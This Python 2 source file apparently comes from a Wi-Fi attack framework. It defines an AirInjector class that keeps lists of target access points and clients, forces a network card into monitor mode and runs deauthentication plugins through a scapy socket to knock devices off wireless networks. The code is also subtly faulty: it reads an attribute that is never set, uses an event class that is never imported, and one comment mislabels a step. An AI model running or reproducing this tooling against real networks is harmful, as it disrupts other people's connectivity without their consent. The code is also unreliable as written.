"""
This class is responsible for performing
the deauthentication attacks, targeted or general
"""

import os
import logging
import traceback
from AuxiliaryModules.aplauncher import APLauncher
from AuxiliaryModules.events import NeutralEvent
from Plugins.deauthenticator import Deauthenticator
from SessionManager.sessionmanager import SessionManager
from scapy.all import conf
from time import sleep
from threading import Thread, Lock
from utils.utils import DEVNULL
from utils.networkmanager import NetworkCard
from utils.wifiutils import AccessPoint, WiFiClient

class AirInjector(object):

    def __init__(self, targeted_only=False, burst_count=5):
        self.injection_running = False
        self.injection_interface = None

        self._previous_mode = None              # Previous mode to restore network card to
        self._targeted_only = targeted_only     # Flag if we only want to perform targeted deauthentication attacks
        self._burst_count = burst_count         # Number of sequential deuathentication packet bursts to send
        self._ap_targets = set()                # MAC addresses of APs, used to send deauthentication packets to broadcast
        self._client_targets = set()            # Pairs clients to their connected AP to send targeted deauthentication attacks
        self.plugins = []

    def add_ap(self, bssid, ssid, channel):
        deauth_ap = AccessPoint(len(self._ap_targets), ssid, bssid, channel)
        self._ap_targets.add(deauth_ap)  # Don't verify duplicates because it's a set
        SessionManager().update_session_data("ap_targets", self._ap_targets)

    def add_client(self, client_mac, associated_bssid, associated_ssid):
        deauth_client = WiFiClient(len(self._client_targets), client_mac, associated_bssid, associated_ssid)
        self._client_targets.add(deauth_client)  # Don't verify duplicates because it's a set
        SessionManager().update_session_data("client_targets", self._client_targets)

    def del_aps(self, aps = ()):
        self._ap_targets -= aps

    def del_clients(self, clients = ()):
        self._client_targets -= clients

    def get_ap_targets(self):
        return self._ap_targets

    def get_client_targets(self):
        return self._client_targets

    def add_plugin(self, plugin):
        self.plugins.append(plugin)

    def injection_attack(self):
        if len(self.plugins) == 0:
            self.add_plugin(Deauthenticator())  # Deauthentication is default behaviour of injector

        injection_socket = conf.L2socket(iface=self.injection_interface)
        for plugin in self.plugins:
            plugin.interpret_targets(self._ap_targets, self._client_targets)
            plugin.set_injection_socket(injection_socket)

        # Launches all added plugins' post injection methods and waits for finish
        self.injection_thread_pool_start("pre_injection")

        # Launches all added plugins' injection attacks and waits for finish
        self.injection_thread_pool_start("inject_packets")

        print "[+] Injection attacks finished executing."
        print "[+] Starting post injection methods"

        # Launches all added plugins' post injection methods and waits for finish
        self.injection_thread_pool_start("post_injection")
        del self.plugins[:]  # Plugin cleanup for next use

        print "[+] Post injection methods finished"

        # Restore state after all threads finishing
        injection_socket.close()
        self.injection_running = False
        self._restore_injection_state()

    def injection_thread_pool_start(self, plugin_method):
        plugin_threads = []
        for plugin in self.plugins:
            plugin_methods = {
                                "pre_injection"  : plugin.pre_injection,
                                "inject_packets" : plugin.inject_packets,
                                "post_injection" : plugin.post_injection
                             }
            plugin_injection_thread = Thread(target =   plugin_methods[plugin_method])
            plugin_threads.append(plugin_injection_thread)
            plugin_injection_thread.start()
            SessionManager().log_event(NeutralEvent("Started '{}' with '{}' plugin.".format(plugin_method, plugin)))

        for thread in plugin_threads:
            thread.join()       # Wait to finish execution
        del plugin_threads[:]   # Cleanup

    def _restore_injection_state(self):
        try:
            card = NetworkCard(self.running_interface)
            if card.get_mode().lower() != self._previous_mode:
                card.set_mode(self._previous_mode)
                self._previous_mode = None
        except: pass

        self.running_interface = None

    def start_injection_attack(self, interface):
        SessionManager().log_event(NeutralEvent("Starting AirInjector module."))
        self.injection_interface = interface
        card = NetworkCard(interface)
        current_mode = card.get_mode().lower()
        self._previous_mode = current_mode
        if not (current_mode == 'monitor' or current_mode == 'ap'):
            try:
                card.set_mode('monitor')
            except:
                SessionManager().log_event(UnsuccessfulEvent("AirInjector start was aborted,"
                                                             " cannot set card to monitor mode."))
                return

        self.injection_running = True
        injection_thread = Thread(target=self.injection_attack)
        injection_thread.start()

    def stop_injection_attack(self):
        for plugin in self.plugins:
            plugin.should_stop = True  # Stop every plugin

    def is_running(self):
        return self.injection_running
